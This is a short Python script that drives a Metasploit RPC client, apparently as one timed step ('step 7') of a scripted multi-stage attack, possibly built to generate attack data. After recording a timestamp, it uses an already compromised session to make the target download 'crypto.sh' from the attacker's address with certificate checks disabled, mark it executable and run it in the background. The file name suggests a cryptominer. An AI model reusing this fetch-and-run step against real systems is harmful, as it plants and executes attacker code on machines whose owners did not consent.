import time
import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient


def record_timestamp(folder, output_time_file):
    output_time_file = os.path.join(folder, output_time_file)
    with open(output_time_file, "w+") as fw:
        fw.write('%f' % time.time())


def main(argv):
    folder = argv[1]
    my_ip = argv[2]
    target_ip = argv[3]

    client = MsfRpcClient('kali')


    # start step 7
    output_time_file = 'time_step_7_start.txt'
    record_timestamp(folder, output_time_file)
    time.sleep(90)
    
    try:
        shell = client.sessions.session('4')
        shell.write('wget --no-check-certificate http://{0}/downloads/crypto.sh'.format(my_ip))
        shell.write('chmod 755 ./crypto.sh')
        shell.write('timeout 60s ./crypto.sh &')
    
    except Exception as e:
        print(e)
        pass



main(sys.argv)
